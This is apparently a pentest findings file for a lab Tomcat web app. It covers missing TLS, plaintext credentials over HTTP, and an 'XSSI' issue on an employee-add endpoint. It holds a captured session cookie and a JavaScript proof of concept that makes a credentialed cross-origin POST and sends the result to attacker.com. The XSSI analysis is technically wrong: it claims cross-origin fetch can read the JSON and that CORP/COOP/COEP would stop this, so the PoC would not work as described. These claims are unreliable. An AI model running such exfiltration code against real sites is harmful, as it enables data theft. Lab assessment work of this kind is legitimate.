---
name: lab-findings-xssi
description: XSSI / Unauthorized Data Inclusion findings from the lab assessment. Captures the resource-isolation failures discovered against the Papermill lab at 10.13.101.122:8080 where authenticated JSON responses include internal object identifiers and lack CORP/COOP/COEP protections. Also captures TLS security misconfigurations, plaintext credential transmission, and HTTP-only service exposure.
tags: []
related_skills: [hunt-tls-network, hunt-api-misconfig, hunt-session, hunt-idor]
---

## TL;DR: MULTIPLE CRITICAL FINDINGS

This lab at 10.13.101.122:8080 has **SEVERE SECURITY MISCONFIGURATIONS**:

1. **No TLS/HTTPS at all** - Server runs HTTP-only
2. **Credentials transmitted in plaintext** - Login and registration APIs send data over HTTP
3. **XSSI vulnerabilities** - JSON endpoints leak internal IDs
4. **Missing security headers** - No CORP/COOP/COEP protection

---

## FINDING 1: NO TLS IMPLEMENTED (CRITICAL)

**Target:** `http://10.13.101.122:8080`  
**Service:** Apache Tomcat 10.1.18  
**Protocol:** Plain HTTP only (no HTTPS)

### Evidence
- Port 8080: HTTP proxy (open)
- Ports 443, 8443: Closed
- SSL/TLS ports: None listening
- Result: **Server transmits ALL data in plaintext**

### Impact
- Man-in-the-middle attacks trivially intercept all traffic
- No way to verify server identity
- Session tokens and credentials exposed
- MITM can modify all requests/responses

### 12-Point TLS Security Assessment Results

| Point | Status | Finding |
|-------|--------|---------|
| 1. Outdated Protocols | N/A | No TLS configured |
| 2. Cipher Suites | N/A | No TLS configured |
| 3. mTLS with Untrusted Cert | N/A | No TLS configured |
| 4. OCSP Stapling | N/A | No TLS configured |
| 5. ECH Enabled | N/A | No TLS configured |
| 6. HTTP→HTTPS Redirect | ❌ FAILING | **NO HTTPS PORTS - CRITICAL MISSING** |
| 7. Certificate Valid | N/A | No TLS configured |
| 8. Internal Communications TLS | ❓ UNKNOWN | Cannot assess without docs |
| 9. Client Cert Validation | N/A | No TLS endpoints |
| 10. Internal HTTP-over-TLS | ❓ UNKNOWN | Cannot verify |
| 11. Self-Signed Cert Trust | ❓ UNKNOWN | Cannot verify |
| 12. Inter-Service mTLS | ❓ UNKNOWN | Cannot verify |

---

## FINDING 2: PLAINTEXT CREDENTIAL TRANSMISSION (CRITICAL)

**The application sends authentication credentials over HTTP without TLS:**

### Login API Endpoint
- **URL:** `POST /api/v1/login`
- **Data:** Email and password in plain text
- **Evidence:** JavaScript uses `location.origin + "/api/v1/login"` which is HTTP

```javascript
// From /js/app.js
$.ajax({
    type: "POST",
    contentType: "application/x-www-form-urlencoded",
    url: location.origin + "/api/v1/login",
    data: {
        "email": $('#email').val(),
        "password": $('#password').val()
    }
});
```

### Registration API Endpoint
- **URL:** `POST /api/v1/customer/register`
- **Data:** Name, email, mobile, organization name and address
- **Risk:** PII transmitted in plaintext

---

## FINDING 3: XSSI - EMPLOYEE ADD ENDPOINT LEAKS INTERNAL IDs
**Method:** POST
**Auth:** Session cookie only (no CSRF token required)

### Vulnerable Behavior
Server processes authenticated POST requests from any origin and returns JSON
that includes internal object identifiers (e.g. `"data":"27"`) without protective
response headers.

### Missing Headers (ASVS V14.3.1 / V14.3.2 violations)
- Missing: `Cross-Origin-Resource-Policy: same-origin`
- Missing: `Cross-Origin-Embedder-Policy: require-corp`
- Missing: `Cross-Origin-Opener-Policy: same-origin`
- Content-Type is `application/json` (loadable by cross-origin fetch/XHR)

### Evidence
```http
POST /api/v1/employee/add HTTP/1.1
Host: 10.13.101.122:8080
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=NjE2ODJiZTQtNmNjMC00NWU2LWEzMTctOWFkZWQxZDRhNTgy

empName=testuser&empMail=[REDACTED_EMAIL]&empMobile=1234567890&userName=testuser&userPassword=Test@1234&empDivision=IT
```

**200 OK Response (truncated):**
```json
{"status":"success","statusCode":"OK","message":"Successfully recorded new employee details.","data":"27","form":null}
```

Note: `"data":"27"` is the internally generated employee ID, leaked to any
cross-origin caller.

### PoC (cross-origin data exfiltration)
```html
<script>
fetch('http://10.13.101.122:8080/api/v1/employee/add', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'empName=xssitest&empMail=[REDACTED_EMAIL]&empMobile=9999999999&userName=xssitest&userPassword=[REDACTED_SECRET]'
})
  .then(r => r.text())
  .then(data => {
    const match = data.match(/"data":"(\d+)"/);
    if (match) fetch('https://attacker.com/log?id=' + match[1]);
  });
</script>
```

### Remediation
Add `Cross-Origin-Resource-Policy: same-origin`, `Cross-Origin-Embedder-Policy`, and
`Cross-Origin-Opener-Policy: same-origin` to authenticated JSON responses.
Do not expose internal object identifiers to unauthenticated cross-origin callers.